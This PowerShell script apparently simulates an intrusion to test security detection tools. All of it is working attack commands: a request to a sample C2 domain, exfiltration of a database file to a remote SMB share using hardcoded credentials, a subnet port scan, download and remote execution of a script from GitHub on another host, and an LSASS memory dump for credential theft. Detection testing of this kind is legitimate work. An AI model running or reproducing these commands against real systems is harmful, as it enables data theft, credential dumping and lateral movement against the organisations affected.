# Umbrella sample C2 domain
$domain = "examplebotnetdomain.com"

# HTTP web request
Invoke-WebRequest $domain

# Print hostname
$env:computername

# Extfiltrate file
# Create new file share link
New-SmbMapping -RemotePath '\\xdr-datastorehost.westeurope.cloudapp.azure.com\exfilFiles' -UserName 'exfil' -Password 'C1sco12345' -LocalPath 'Z:'
# Copy temp file to remote share
copy 'C:\Temp\super-secret-db.db' 'Z:\'
# Remove mapping
Remove-SmbMapping -LocalPath 'Z:' -Force

# Install Powershell NMap module
Install-Module -Name PSnmap -Scope CurrentUser -Force
# Run NMap scan on firewalled subnet
Invoke-PSnmap -Cn 10.200.200.0/24 -ScanOnPingFail -Port 443, 3389, 22, 5985, 5986 -Dns -PortConnectTimeoutMs 1000 -AddService

# Download file extract script
Invoke-WebRequest https://raw.githubusercontent.com/bassmandan/poc-scripts/refs/heads/main/file_extract.ps1 -OutFile C:\ProgramData\file_extract.ps1

# Run remote script
Invoke-Command -ComputerName 10.200.200.70 -Credential securex.local\david.altass -FilePath C:\ProgramData\file_extract.ps1

# Attempt credential theft
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\Windows\Temp\lsass.dmp full

# Prevent the PowerShell window from closing immediately - for visibility in testing
Read-Host -Prompt "Press Enter to exit"
